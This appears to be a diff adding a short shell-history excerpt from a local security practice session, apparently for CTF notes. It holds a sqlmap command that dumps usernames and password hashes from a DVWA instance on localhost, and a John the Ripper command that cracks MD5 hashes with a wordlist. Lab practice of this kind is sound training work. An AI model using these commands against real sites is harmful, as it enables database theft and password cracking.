@@ -1,0 +1,20 @@
+  461  cat hash.txt
+  462  cd hash.txt
+  463  nano hash.txt
+  464  nano hashmtxt
+  465  nano hash
+  466  nano hash.txt
+  467  rm mini.txt
+  468  john ~/toolsTest/hash.txt --format=Raw-MD5 --wordlist=/data/data/com.termux/files/usr/share/john/password.lst
+  469  cd
+  470  cd DVWE
+  471  cd DVWA
+  472  sqlmap -u "http://127.0.0.1:8000/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE; security=low" --batch -D dvwa -T users -C user,password --dump --format=CSV
+  473  clear
+  474  php -S 127.0.0.1:8000
+  475  ls
+  476  cd toolsTest
+  477  ls
+  478  python multi.py
+  479  ls
+  480  history | tail -n 20 > ctf_notesblackbox.txt
